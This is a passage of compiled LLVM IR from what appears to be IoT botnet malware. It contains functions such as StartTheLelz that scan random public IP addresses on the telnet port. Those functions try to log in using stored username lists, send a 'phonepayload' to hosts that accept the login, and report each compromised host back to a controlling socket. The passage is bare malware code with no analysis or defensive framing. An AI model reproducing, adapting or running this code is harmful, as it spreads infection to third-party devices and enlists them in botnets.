  %74 = load i32, i32* %73, align 16
  %75 = srem i32 %74, 64
  %76 = zext i32 %75 to i64
  %77 = shl i64 1, %76
  %78 = sdiv i32 %74, 64
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %79
  %81 = load i64, i64* %80, align 8
  %82 = or i64 %77, %81
  store i64 %82, i64* %80, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %3, align 16
  %83 = add nsw i32 %74, 1
  %84 = call i32 @select(i32 %83, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #5
  switch i32 %84, label %105 [
    i32 1, label %85
    i32 -1, label %101
  ]

; <label>:85:                                     ; preds = %71
  store i32 4, i32* %4, align 4
  store i32 0, i32* %1, align 4
  %86 = load i32, i32* %73, align 16
  %87 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* nonnull %20, i32* nonnull %4) #5
  %88 = load i32, i32* %1, align 4
  %89 = icmp eq i32 %88, 0
  %90 = load i32, i32* %73, align 16
  br i1 %89, label %94, label %91

; <label>:91:                                     ; preds = %85
  %92 = call i32 @sclose(i32 %90)
  store i8 0, i8* %38, align 8
  %93 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %93, align 1
  br label %243

; <label>:94:                                     ; preds = %85
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 3, i8* null) #5
  %96 = and i32 %95, -2049
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 4, i32 %96) #5
  store i32 0, i32* %32, align 16
  %98 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 8
  store i16 0, i16* %98, align 4
  %99 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %100 = load i8*, i8** %99, align 8
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 512, i32 1, i1 false)
  store i8 2, i8* %38, align 8
  br label %243

; <label>:101:                                    ; preds = %71
  %102 = load i32, i32* %73, align 16
  %103 = call i32 @sclose(i32 %102)
  store i8 0, i8* %38, align 8
  %104 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %104, align 1
  br label %243

; <label>:105:                                    ; preds = %71
  %106 = load i32, i32* %32, align 16
  %107 = add i32 %106, 6
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %109 = icmp ult i32 %107, %108
  br i1 %109, label %110, label %243

; <label>:110:                                    ; preds = %105
  %111 = load i32, i32* %73, align 16
  %112 = call i32 @sclose(i32 %111)
  store i8 0, i8* %38, align 8
  %113 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %113, align 1
  br label %243

; <label>:114:                                    ; preds = %37
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %116 = load i32, i32* %115, align 16
  %117 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @read_until_response(i32 %116, i32 10000, i8* %118, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i64 0, i64 0))
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %125, label %121

; <label>:121:                                    ; preds = %114
  %122 = load i8*, i8** %117, align 8
  %123 = call i32 @contains_fail(i8* %122)
  %124 = icmp ne i32 %123, 0
  %.sink = select i1 %124, i8 0, i8 3
  store i8 %.sink, i8* %38, align 8
  br label %243

; <label>:125:                                    ; preds = %114
  %126 = load i32, i32* %32, align 16
  %127 = add i32 %126, 6
  %128 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %129 = icmp ult i32 %127, %128
  br i1 %129, label %130, label %243

; <label>:130:                                    ; preds = %125
  store i8 0, i8* %38, align 8
  %131 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %131, align 1
  br label %243

; <label>:132:                                    ; preds = %37
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %134 = load i32, i32* %133, align 16
  %135 = call i64 @send(i32 %134, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i64 0, i64 0), i64 7, i32 16384) #5
  %136 = icmp slt i64 %135, 0
  br i1 %136, label %137, label %139

; <label>:137:                                    ; preds = %132
  store i8 0, i8* %38, align 8
  %138 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %138, align 1
  br label %243

; <label>:139:                                    ; preds = %132
  store i8 4, i8* %38, align 8
  br label %243

; <label>:140:                                    ; preds = %37
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %142 = load i32, i32* %141, align 16
  %143 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @read_until_response(i32 %142, i32 10000, i8* %144, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i64 0, i64 0))
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %151, label %147

; <label>:147:                                    ; preds = %140
  %148 = load i8*, i8** %143, align 8
  %149 = call i32 @contains_fail(i8* %148)
  %150 = icmp ne i32 %149, 0
  %.sink1 = select i1 %150, i8 0, i8 5
  store i8 %.sink1, i8* %38, align 8
  br label %243

; <label>:151:                                    ; preds = %140
  %152 = load i32, i32* %32, align 16
  %153 = add i32 %152, 6
  %154 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %155 = icmp ult i32 %153, %154
  br i1 %155, label %156, label %243

; <label>:156:                                    ; preds = %151
  store i8 0, i8* %38, align 8
  %157 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %157, align 1
  br label %243

; <label>:158:                                    ; preds = %37
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %160 = load i32, i32* %159, align 16
  %161 = call i64 @send(i32 %160, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i64 0, i64 0), i64 7, i32 16384) #5
  %162 = icmp slt i64 %161, 0
  br i1 %162, label %163, label %165

; <label>:163:                                    ; preds = %158
  store i8 0, i8* %38, align 8
  %164 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %164, align 1
  br label %243

; <label>:165:                                    ; preds = %158
  store i8 6, i8* %38, align 8
  br label %243

; <label>:166:                                    ; preds = %37
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %168 = load i32, i32* %167, align 16
  %169 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @read_until_response(i32 %168, i32 10000, i8* %170, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %183, label %173

; <label>:173:                                    ; preds = %166
  %174 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %174, i32* %32, align 16
  %175 = load i8*, i8** %169, align 8
  %176 = call i32 @contains_fail(i8* %175)
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %182

; <label>:178:                                    ; preds = %173
  %179 = load i32, i32* @mainCommSock, align 4
  %180 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %31)
  %181 = call i32 (i32, i8*, ...) @sockprintf(i32 %179, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.304, i64 0, i64 0), i8* %180)
  br label %182

; <label>:182:                                    ; preds = %173, %178
  %.sink2 = phi i8 [ 7, %178 ], [ 0, %173 ]
  store i8 %.sink2, i8* %38, align 8
  br label %243

; <label>:183:                                    ; preds = %166
  %184 = load i32, i32* %32, align 16
  %185 = add i32 %184, 7
  %186 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %187 = icmp ult i32 %185, %186
  br i1 %187, label %188, label %243

; <label>:188:                                    ; preds = %183
  store i8 0, i8* %38, align 8
  %189 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %189, align 1
  br label %243

; <label>:190:                                    ; preds = %37
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = call i64 @send(i32 %192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i64 0, i64 0), i64 4, i32 16384) #5
  %194 = icmp slt i64 %193, 0
  br i1 %194, label %195, label %197

; <label>:195:                                    ; preds = %190
  store i8 0, i8* %38, align 8
  %196 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %196, align 1
  br label %243

; <label>:197:                                    ; preds = %190
  store i8 8, i8* %38, align 8
  br label %243

; <label>:198:                                    ; preds = %37
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @read_until_response(i32 %200, i32 10000, i8* %202, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i64 0, i64 0))
  %204 = icmp eq i32 %203, 0
  br i1 %204, label %209, label %205

; <label>:205:                                    ; preds = %198
  %206 = load i8*, i8** %201, align 8
  %207 = call i32 @contains_fail(i8* %206)
  %208 = icmp ne i32 %207, 0
  %.sink7 = select i1 %208, i8 0, i8 9
  store i8 %.sink7, i8* %38, align 8
  br label %243

; <label>:209:                                    ; preds = %198
  %210 = load i32, i32* %32, align 16
  %211 = add i32 %210, 6
  %212 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %213 = icmp ult i32 %211, %212
  br i1 %213, label %214, label %243

; <label>:214:                                    ; preds = %209
  store i8 0, i8* %38, align 8
  %215 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %215, align 1
  br label %243

; <label>:216:                                    ; preds = %37
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = call i64 @send(i32 %218, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.306, i64 0, i64 0), i64 12, i32 16384) #5
  %220 = icmp slt i64 %219, 0
  br i1 %220, label %221, label %223

; <label>:221:                                    ; preds = %216
  store i8 0, i8* %38, align 8
  %222 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %222, align 1
  br label %243

; <label>:223:                                    ; preds = %216
  store i8 10, i8* %38, align 8
  br label %243

; <label>:224:                                    ; preds = %37
  %225 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %225, i32* %32, align 16
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = load i8*, i8** @phonepayload, align 8
  %229 = call i64 @strlen(i8* %228) #15
  %230 = call i64 @send(i32 %227, i8* %228, i64 %229, i32 16384) #5
  %231 = icmp slt i64 %230, 0
  br i1 %231, label %232, label %236

; <label>:232:                                    ; preds = %224
  %233 = load i32, i32* %226, align 16
  %234 = call i32 @sclose(i32 %233)
  store i8 0, i8* %38, align 8
  %235 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 1, i8* %235, align 1
  br label %243

; <label>:236:                                    ; preds = %224
  %237 = getelementptr inbounds [512 x %struct.telstate_t], [512 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  store i8 3, i8* %237, align 1
  %238 = load i32, i32* %32, align 16
  %239 = add i32 %238, 60
  %240 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %241 = icmp ult i32 %239, %240
  br i1 %241, label %242, label %243

; <label>:242:                                    ; preds = %236
  store i8 0, i8* %38, align 8
  store i8 1, i8* %237, align 1
  br label %243

; <label>:243:                                    ; preds = %37, %139, %165, %197, %223, %70, %67, %110, %105, %130, %125, %156, %151, %188, %183, %214, %209, %242, %236, %91, %94, %51, %232, %221, %205, %195, %182, %163, %147, %137, %121, %101
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 512
  br i1 %exitcond, label %.loopexit.loopexit, label %30
}

declare i32 @time(...) local_unnamed_addr #6

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %7 = tail call i32 @rand_cmwc()
  %8 = xor i32 %7, %6
  tail call void @srand(i32 %8) #5
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %10, i16* %11, align 2
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %13 = bitcast i8* %12 to i64*
  store i64 0, i64* %13, align 4
  %14 = tail call noalias i8* @malloc(i64 513) #5
  tail call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 513, i32 1, i1 false)
  %15 = alloca [1000 x %struct.telstate_t], align 16
  %16 = bitcast [1000 x %struct.telstate_t]* %15 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 5000, i32 16, i1 false)
  br label %17

; <label>:17:                                     ; preds = %17, %0
  %indvars.iv108 = phi i64 [ 0, %0 ], [ %indvars.iv.next109.1, %17 ]
  %18 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv108
  %19 = bitcast %struct.telstate_t* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 32, i32 16, i1 false)
  %20 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv108, i32 3
  store i8 1, i8* %20, align 1
  %21 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv108, i32 9
  store i8* %14, i8** %21, align 8
  %indvars.iv.next109 = or i64 %indvars.iv108, 1
  %22 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next109
  %23 = bitcast %struct.telstate_t* %22 to i8*
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 32, i32 16, i1 false)
  %24 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next109, i32 3
  store i8 1, i8* %24, align 1
  %25 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv.next109, i32 9
  store i8* %14, i8** %25, align 8
  %indvars.iv.next109.1 = add nsw i64 %indvars.iv108, 2
  %exitcond110.1 = icmp eq i64 %indvars.iv.next109.1, 1000
  br i1 %exitcond110.1, label %.preheader103.preheader, label %17

.preheader103.preheader:                          ; preds = %17
  br label %.preheader103

.preheader103:                                    ; preds = %.preheader103.preheader, %.preheader103
  %indvars.iv106 = phi i64 [ %indvars.iv.next107, %.preheader103 ], [ 0, %.preheader103.preheader ]
  %indvars.iv.next107 = add nuw nsw i64 %indvars.iv106, 1
  %26 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %indvars.iv.next107
  %27 = load i8*, i8** %26, align 8
  %28 = icmp eq i8* %27, null
  br i1 %28, label %.preheader, label %.preheader103

.preheader:                                       ; preds = %.preheader103
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %30 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %31 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %32 = bitcast i32* %4 to i8*
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %286
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  br label %33

; <label>:33:                                     ; preds = %286, %.loopexit
  %indvars.iv = phi i64 [ 0, %.loopexit ], [ %indvars.iv.next, %286 ]
  %34 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv
  %35 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 7
  %36 = load i32, i32* %35, align 16
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %40

; <label>:38:                                     ; preds = %33
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %39, i32* %35, align 16
  br label %40

; <label>:40:                                     ; preds = %38, %33
  %41 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 2
  %42 = load i8, i8* %41, align 8
  switch i8 %42, label %286 [
    i8 0, label %43
    i8 1, label %84
    i8 2, label %116
    i8 3, label %135
    i8 4, label %153
    i8 5, label %172
    i8 6, label %190
    i8 7, label %233
  ]

; <label>:43:                                     ; preds = %40
  %44 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 0
  br i1 %46, label %54, label %47

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %49 = bitcast i8** %48 to i64*
  %50 = load i64, i64* %49, align 8
  %51 = bitcast %struct.telstate_t* %34 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  store i64 %50, i64* %49, align 8
  %52 = call i32 @getRandomPublicIP()
  %53 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 1
  store i32 %52, i32* %53, align 4
  br label %66

; <label>:54:                                     ; preds = %43
  %55 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 5
  %56 = load i8, i8* %55, align 1
  %57 = add i8 %56, 1
  store i8 %57, i8* %55, align 1
  %58 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 4
  %59 = load i8, i8* %58, align 2
  %60 = add i8 %59, 1
  store i8 %60, i8* %58, align 2
  %61 = icmp eq i8 %56, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %54
  store i8 1, i8* %44, align 1
  br label %286

; <label>:63:                                     ; preds = %54
  %64 = icmp eq i8 %59, 0
  br i1 %64, label %65, label %._crit_edge

._crit_edge:                                      ; preds = %63
  %.phi.trans.insert = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 1
  %.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %66

; <label>:65:                                     ; preds = %63
  store i8 1, i8* %44, align 1
  br label %286

; <label>:66:                                     ; preds = %._crit_edge, %47
  %67 = phi i32 [ %.pre, %._crit_edge ], [ %52, %47 ]
  store i16 2, i16* %9, align 4
  store i16 %10, i16* %11, align 2
  store i64 0, i64* %13, align 4
  store i32 %67, i32* %29, align 4
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  store i32 %68, i32* %69, align 16
  %70 = icmp eq i32 %68, -1
  br i1 %70, label %286, label %71

; <label>:71:                                     ; preds = %66
  %72 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 3, i8* null) #5
  %73 = or i32 %72, 2048
  %74 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 4, i32 %73) #5
  %75 = load i32, i32* %69, align 16
  %76 = call i32 @connect(i32 %75, %struct.sockaddr* nonnull %30, i32 16) #5
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %83

; <label>:78:                                     ; preds = %71
  %79 = tail call i32* @__errno_location() #18
  %80 = load i32, i32* %79, align 4
  %81 = icmp eq i32 %80, 115
  br i1 %81, label %83, label %82

; <label>:82:                                     ; preds = %78
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:83:                                     ; preds = %78, %71
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 1)
  br label %286

; <label>:84:                                     ; preds = %40
  %85 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %31) #5, !srcloc !21
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %87 = load i32, i32* %86, align 16
  %88 = srem i32 %87, 64
  %89 = zext i32 %88 to i64
  %90 = shl i64 1, %89
  %91 = sdiv i32 %87, 64
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = or i64 %90, %94
  store i64 %95, i64* %93, align 8
  store <2 x i64> <i64 0, i64 10>, <2 x i64>* %2, align 16
  %96 = add nsw i32 %87, 1
  %97 = call i32 @select(i32 %96, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #5
  switch i32 %97, label %110 [
    i32 1, label %98
    i32 -1, label %109
  ]

; <label>:98:                                     ; preds = %84
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %99 = load i32, i32* %86, align 16
  %100 = call i32 @getsockopt(i32 %99, i32 1, i32 4, i8* nonnull %32, i32* nonnull %3) #5
  %101 = load i32, i32* %4, align 4
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %104, label %103

; <label>:103:                                    ; preds = %98
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:104:                                    ; preds = %98
  %105 = load i32, i32* %86, align 16
  %106 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 3, i8* null) #5
  %107 = and i32 %106, -2049
  %108 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 4, i32 %107) #5
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 2)
  br label %286

; <label>:109:                                    ; preds = %84
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:110:                                    ; preds = %84
  %111 = load i32, i32* %35, align 16
  %112 = add i32 %111, 3
  %113 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %114 = icmp ult i32 %112, %113
  br i1 %114, label %115, label %286

; <label>:115:                                    ; preds = %110
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:116:                                    ; preds = %40
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %118 = load i32, i32* %117, align 16
  %119 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @read_until_response(i32 %118, i32 10, i8* %120, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %129, label %123

; <label>:123:                                    ; preds = %116
  %124 = load i8*, i8** %119, align 8
  %125 = call i32 @contains_fail(i8* %124)
  %126 = icmp eq i32 %125, 0
  br i1 %126, label %128, label %127

; <label>:127:                                    ; preds = %123
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 0)
  br label %286

; <label>:128:                                    ; preds = %123
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 3)
  br label %286

; <label>:129:                                    ; preds = %116
  %130 = load i32, i32* %35, align 16
  %131 = add i32 %130, 3
  %132 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %133 = icmp ult i32 %131, %132
  br i1 %133, label %134, label %286

; <label>:134:                                    ; preds = %129
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:135:                                    ; preds = %40
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %137 = load i32, i32* %136, align 16
  %138 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 4
  %139 = load i8, i8* %138, align 2
  %140 = zext i8 %139 to i64
  %141 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %140
  %142 = load i8*, i8** %141, align 8
  %143 = call i64 @strlen(i8* %142) #15
  %144 = call i64 @send(i32 %137, i8* %142, i64 %143, i32 16384) #5
  %145 = icmp slt i64 %144, 0
  br i1 %145, label %146, label %147

; <label>:146:                                    ; preds = %135
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:147:                                    ; preds = %135
  %148 = load i32, i32* %136, align 16
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i64 0, i64 0), i64 2, i32 16384) #5
  %150 = icmp slt i64 %149, 0
  br i1 %150, label %151, label %152

; <label>:151:                                    ; preds = %147
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:152:                                    ; preds = %147
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 4)
  br label %286

; <label>:153:                                    ; preds = %40
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %155 = load i32, i32* %154, align 16
  %156 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @read_until_response(i32 %155, i32 10, i8* %157, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %166, label %160

; <label>:160:                                    ; preds = %153
  %161 = load i8*, i8** %156, align 8
  %162 = call i32 @contains_fail(i8* %161)
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %165, label %164

; <label>:164:                                    ; preds = %160
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 0)
  br label %286

; <label>:165:                                    ; preds = %160
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 5)
  br label %286

; <label>:166:                                    ; preds = %153
  %167 = load i32, i32* %35, align 16
  %168 = add i32 %167, 6
  %169 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %170 = icmp ult i32 %168, %169
  br i1 %170, label %171, label %286

; <label>:171:                                    ; preds = %166
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:172:                                    ; preds = %40
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %174 = load i32, i32* %173, align 16
  %175 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i64
